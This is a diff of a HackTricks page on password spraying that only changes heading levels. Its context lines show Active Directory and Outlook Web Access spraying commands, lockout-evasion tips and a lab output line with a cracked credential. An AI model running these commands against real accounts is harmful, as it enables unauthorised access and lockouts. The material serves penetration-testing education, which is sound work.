@@ -17,9 +17,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Password Spraying
-
-## **Password Spraying**
+# **Password Spraying**
 
 Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
 By **default** the **minimum** **password** **length** is **7**.
@@ -28,7 +26,7 @@ Lists of common usernames could also be useful: [https://github.com/insidetrust/
 
 Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
 
-### Get password policy
+## Get password policy
 
 If you have some user credentials or a shell as a domain user you can get the password policy with:
 
@@ -36,7 +34,7 @@ If you have some user credentials or a shell as a domain user you can get the pa
 * `enum4linx -u 'username' -p 'password' -P <IP>`
 * `(Get-DomainPolicy)."SystemAccess" #From powerview`
 
-### Exploitation
+## Exploitation
 
 Using **crackmapexec:**
 
@@ -82,7 +80,7 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 
 or **spray** (read next section).
 
-### Lockout check
+## Lockout check
 
 The best way is not to try with more than 5/7 passwords per account.
 
@@ -92,7 +90,7 @@ So you have to be very careful with password spraying because you could lockout 
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
 
-## Outlook Web Access
+# Outlook Web Access
 
 There are multiples tools for password spraying outlook.
 
@@ -123,7 +121,7 @@ $ ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords pass
     [+] Success: S.SVENSSON:Summer2020
 ```
 
-## References :
+# References :
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
